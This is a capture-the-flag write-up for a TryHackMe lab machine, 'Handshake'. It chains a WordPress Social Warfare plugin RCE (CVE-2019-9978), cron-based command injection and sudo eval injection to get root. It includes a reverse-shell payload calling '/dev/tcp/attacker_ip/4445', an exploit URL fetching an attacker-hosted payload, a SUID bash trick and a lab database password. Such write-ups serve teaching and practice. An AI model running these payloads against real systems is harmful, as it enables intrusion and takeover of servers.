# THM: Handshake - Detailed Writeup

**Author**: Huseyin Mardinli

**Date**: 2025-05-19

---

## Introduction

"Handshake" is a custom-made vulnerable machine for TryHackMe, designed to test a wide spectrum of pentesting skills: reconnaissance, web exploitation, Linux privilege escalation, and post-exploitation through misconfigured automation. The target leverages a vulnerable WordPress plugin and insecure custom scripts with cron-based automation, ultimately leading to root access via command injection.

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sC -sV HOST_IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Handshake
|_http-generator: WordPress 6.8.1
```

SSH and HTTP services are open. WordPress is hosted on port 80.

### 1.2 Hostname Mapping

```bash
echo "HOST_IP handshake.thm" | sudo tee -a /etc/hosts
```

### 1.3 WordPress Enumeration

```bash
wpscan --url http://handshake.thm
```

Output reveals:

* **WordPress Version**: 5.2.2
* **Plugin**: Social Warfare v3.5.2
* **Vulnerability**: CVE-2019-9978 — Unauthenticated RCE via `swp_debug` parameter.

You can find two exploits here 

🔗 Single github exploit file (<=3.5.2): [https://github.com/Housma/CVE-2019-9978-Social-Warfare-WordPress-Plugin-RCE](https://github.com/Housma/CVE-2019-9978-Social-Warfare-WordPress-Plugin-RCE)

And


🔗 CVE-2019-9978 - (PoC) RCE in Social WarFare Plugin (<=3.5.2): [https://github.com/hash3liZer/CVE-2019-9978](https://github.com/hash3liZer/CVE-2019-9978)

---

## 2. Gaining Initial Foothold

## CVE-2019-9978 Exploit Usage

This exploit automates the following:

* Generates a PHP reverse shell payload with proper escaping.
* Hosts the payload on a Python HTTP server.
* Triggers the exploit using the vulnerable plugin.
* Catches a reverse shell via Netcat.

### Requirements

* Python 3
* Netcat (`nc`)
* The target (`handshake.thm`) should resolve correctly to its IP.

### Setup

Clone the exploit and run:

```bash
git clone https://github.com/Housma/CVE-2019-9978-Social-Warfare-WordPress-Plugin-RCE.git
cd CVE-2019-9978-Social-Warfare-WordPress-Plugin-RCE
python3 exploit.py
```

### Configuration in Script

Edit `exploit.py` and set:

```python
TARGET_URL = "http://handshake.thm"
ATTACKER_IP = "YOUR_IP"
LISTEN_PORT = 4444
```

### Example Output

```bash
[+] Payload written to payload.txt
[+] HTTP server running at port 8000
[+] Listening on port 4444 for reverse shell...
[+] Sending exploit: http://handshake.thm/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://YOUR_IP:8000/payload.txt
```

On successful exploitation, you'll receive a reverse shell as `www-data`:

```bash
www-data@handshake:/var/www/html/wp-admin$
```


---

## 3. Privilege Escalation to Bob

### 3.1 Discover MySQL Credentials

```bash
cat wp-config.php | grep DB_
```

```php
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', '0!@KvnTuv%4' );
```

### 3.2 Analyze Cron Job

```bash
cat /etc/crontab
```

```
*/1 * * * * bob /usr/local/bin/gen_sitemap.py
```

**gen\_sitemap.py** runs every minute. It connects to MySQL, fetches WordPress slugs, and calls `curl` on them — without sanitization.

#### Vulnerable Function

```python
def check_url(url):
    cmd = f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 2 {url} | grep 200 > /dev/null"
    return os.system(cmd) == 0
```

### 3.3 Exploit Command Injection

Insert payload into WordPress database via MySQL:

    mysql -u wp_user -p 

    use wordpress;

    INSERT INTO wp_posts( post_author ,post_date ,post_date_gmt ,post_content ,post_title ,post_excerpt ,post_status ,comment_status ,ping_status ,post_name ,post_modified ,post_modified_gmt ,post_type ,to_ping ,pinged ,post_content_filtered ,post_parent ,guid ,menu_order ,post_mime_type ,comment_count) VALUES ( 1 ,NOW() ,NOW() ,'Exploit' ,'Exploit' ,'' ,'publish' ,'open' ,'open' ,"| bash -c 'bash -i >& /dev/tcp/attacker_ip/4445 0>&1'" ,NOW() ,NOW() ,'post' ,'' ,'' ,'' ,0 ,'http://handshake.thm/?p=99999' ,0 ,'' ,0 );
    
    

Set up listener:

```bash
nc -lnvp 4445
```


After 1 minutes, received connection as bob:

    bob@handshake:~$ id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)




## 4. Privilege Escalation to Root

### 4.1 Sudo Permissions

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/local/bin/scan
```

### 4.2 Vulnerable Scan Script

```bash
cat /usr/local/bin/scan
```

```bash
SCAN_RESULT=$(eval "clamscan $@")
```

The script uses `eval` unsafely — allowing command injection.

### 4.3 Exploit

```bash
sudo /usr/local/bin/scan ';cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
/tmp/rootbash -p
```

Result:

```bash
rootbash-5.0# id
uid=1001(bob) gid=1001(bob) euid=0(root)
```

---

## Conclusion

The "Handshake" machine demonstrates:

* Discovery and exploitation of outdated WordPress plugins.
* Abuse of unsanitized cron jobs and custom scripts.
* Full chain from web foothold to root via simple yet realistic misconfigurations.

